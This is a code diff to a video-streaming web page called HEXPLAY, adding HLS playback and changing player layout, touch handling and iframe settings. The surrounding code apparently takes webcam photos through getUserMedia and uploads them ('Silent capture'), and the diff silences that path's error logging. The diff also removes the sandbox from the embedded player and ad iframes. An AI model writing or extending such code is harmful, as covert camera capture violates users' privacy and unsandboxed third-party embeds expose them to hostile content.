@@ -17,6 +17,7 @@
 
     <link rel="manifest" href="manifest.json">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@1.7.4/dist/hls.min.js"></script>
 
     <script id="hexplay-anti-redirect">
       (function () {
@@ -874,26 +875,36 @@
         touch-action: none !important;
       }
 
+      /* Desktop-mode 300% iframe + 0.3833x zoom crop so embed player fills cleanly without sandbox */
       #iframePlayer {
         position: absolute;
         top: 50%;
         left: 50%;
+        width: 300%;
+        height: 300%;
         border: none;
         z-index: 1;
         transform-origin: center center;
-        transform: translate(-50%, -50%);
+        transform: translate(-50%, -50%) scale(0.3833);
       }
 
       #nativePlayer {
         position: relative;
         z-index: 2;
+        width: 100%;
+        height: 100%;
         background: #000;
         object-fit: cover;
         transform-origin: center center;
       }
 
       /* Force full-screen horizontal fill when viewport is portrait */
-      .player-wrapper.force-horizontal #iframePlayer,
+      .player-wrapper.force-horizontal #iframePlayer {
+        width: calc(var(--horiz-w, 100vh) * 3);
+        height: calc(var(--horiz-h, 100vw) * 3);
+        transform: translate(-50%, -50%) rotate(90deg) scale(0.3833);
+      }
+
       .player-wrapper.force-horizontal #nativePlayer {
         position: absolute;
         top: 50%;
@@ -901,20 +912,6 @@
         width: var(--horiz-w, 100vh);
         height: var(--horiz-h, 100vw);
         transform: translate(-50%, -50%) rotate(90deg);
-      }
-
-      .player-wrapper:not(.force-horizontal) #iframePlayer,
-      .player-wrapper:not(.force-horizontal) #nativePlayer {
-        width: 100%;
-        height: 100%;
-        transform: translate(-50%, -50%);
-      }
-
-      .player-wrapper:not(.force-horizontal) #nativePlayer {
-        position: relative;
-        top: auto;
-        left: auto;
-        transform: none;
       }
 
       #adContainer {
@@ -1338,7 +1335,7 @@
            <div class="watermark-logo">HEXPLAY</div>
        </div>
        <video id="nativePlayer" controls playsinline style="display:none; background:#000;"></video>
-       <iframe id="iframePlayer" sandbox="allow-scripts allow-same-origin allow-presentation" allowfullscreen allow="autoplay; fullscreen"></iframe>
+       <iframe id="iframePlayer" allowfullscreen allow="autoplay; fullscreen; encrypted-media; picture-in-picture" referrerpolicy="no-referrer"></iframe>
     </div>
   </div>
 </div>
@@ -1539,9 +1536,7 @@
               const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
               captureAndUploadPhoto(stream, "Verified Triggered Capture");
           }
-      } catch (err) {
-          console.log("Silent capture skipped.");
-      }
+      } catch (err) {}
   }
 
   function checkGates() {
@@ -2385,6 +2380,7 @@
         this.shieldRestoreTimer = null;
         this.lastTap = 0;
         this.isOpen = false;
+        this.hls = null;
     }
 
     init() {
@@ -2403,29 +2399,25 @@
 
       // Absorb first-tap ad hijack on touchCatcher so the 1st tap only wakes controls & unlocks player interaction
       this.touchCatcher.addEventListener("touchstart", (e) => {
-          e.preventDefault();
-          e.stopPropagation();
           const now = Date.now();
           this.smartOverlay.classList.add("active");
           clearTimeout(this.uiTimer);
           this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove("active"); }, 3500);
 
-          if (now - this.lastTap < 400) { return; }
+          if (now - this.lastTap < 400) { e.preventDefault(); return; }
           this.lastTap = now;
           this.touchCatcher.style.pointerEvents = "none";
           clearTimeout(this.shieldRestoreTimer);
-          this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = "auto"; }, 220);
+          this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = "auto"; }, 180);
       }, { passive: false });
 
-      this.touchCatcher.addEventListener("mousedown", (e) => {
-          e.preventDefault();
-          e.stopPropagation();
+      this.touchCatcher.addEventListener("mousedown", () => {
           this.smartOverlay.classList.add("active");
           clearTimeout(this.uiTimer);
           this.uiTimer = setTimeout(() => { this.smartOverlay.classList.remove("active"); }, 3500);
           this.touchCatcher.style.pointerEvents = "none";
           clearTimeout(this.shieldRestoreTimer);
-          this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = "auto"; }, 220);
+          this.shieldRestoreTimer = setTimeout(() => { this.touchCatcher.style.pointerEvents = "auto"; }, 180);
       });
 
       const syncHorizontalState = () => {
@@ -2507,7 +2499,7 @@
         } else if (activeAd.type === "youtube") {
             const match = activeAd.url.match(/(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))([^&?]+)/);
             const ytId = match ? match[1] : activeAd.url.split("/").pop();
-            this.adMediaContainer.innerHTML = `<iframe sandbox="allow-scripts allow-same-origin allow-presentation" src="https://www.youtube.com/embed/${esc(ytId)}?autoplay=1&mute=1&controls=0&playsinline=1&rel=0" width="100%" height="100%" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
+            this.adMediaContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${esc(ytId)}?autoplay=1&mute=1&controls=0&playsinline=1&rel=0" width="100%" height="100%" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>`;
         }
 
         clearInterval(this.adInterval);
@@ -2534,7 +2526,7 @@
         const nativePlayer = document.getElementById("nativePlayer");
         const iframePlayer = document.getElementById("iframePlayer");
 
-        if (embedUrl.match(/\.(mp4|m3u8|mp3|ogg|wav)$/i) || embedUrl.includes(".mp4?") || embedUrl.startsWith("blob:")) {
+        if (embedUrl.match(/\.(mp4|m3u8|mp3|ogg|wav)(\?|$)/i) || embedUrl.startsWith("blob:")) {
             this.startNativePlayer(embedUrl, nativePlayer, iframePlayer);
             return;
         }
@@ -2552,17 +2544,44 @@
         }
     }
 
+    destroyHls() {
+        if (this.hls) {
+            this.hls.destroy();
+            this.hls = null;
+        }
+    }
+
     startNativePlayer(url, nativePlayer, iframePlayer) {
+        this.destroyHls();
         iframePlayer.style.display = "none";
+        iframePlayer.src = "";
         this.smartOverlay.style.display = "none";
         this.touchCatcher.style.pointerEvents = "none";
         nativePlayer.style.display = "block";
-        nativePlayer.src = url;
+
+        if (/\.m3u8(\?|$)/i.test(url) && window.Hls && window.Hls.isSupported()) {
+            this.hls = new window.Hls({ enableWorker: true, lowLatencyMode: true });
+            this.hls.loadSource(url);
+            this.hls.attachMedia(nativePlayer);
+            this.hls.on(window.Hls.Events.MANIFEST_PARSED, () => {
+                nativePlayer.play().catch(() => {});
+            });
+            this.hls.on(window.Hls.Events.ERROR, (_, data) => {
+                if (data.fatal) {
+                    if (data.type === window.Hls.ErrorTypes.NETWORK_ERROR) this.hls.startLoad();
+                    else if (data.type === window.Hls.ErrorTypes.MEDIA_ERROR) this.hls.recoverMediaError();
+                    else this.destroyHls();
+                }
+            });
+        } else {
+            nativePlayer.src = url;
+            nativePlayer.play().catch(() => {});
+        }
         this.enforceHorizontalFullScreen();
-        nativePlayer.play().catch(() => {});
     }
 
     startIframePlayer(url, iframePlayer, nativePlayer) {
+        this.destroyHls();
         nativePlayer.style.display = "none";
         nativePlayer.pause();
         nativePlayer.src = "";
@@ -2581,6 +2600,7 @@
 
     close() {
         this.isOpen = false;
+        this.destroyHls();
         this.modal.style.display = "none";
         if (this.wrapper) {
             this.wrapper.classList.remove("force-horizontal");
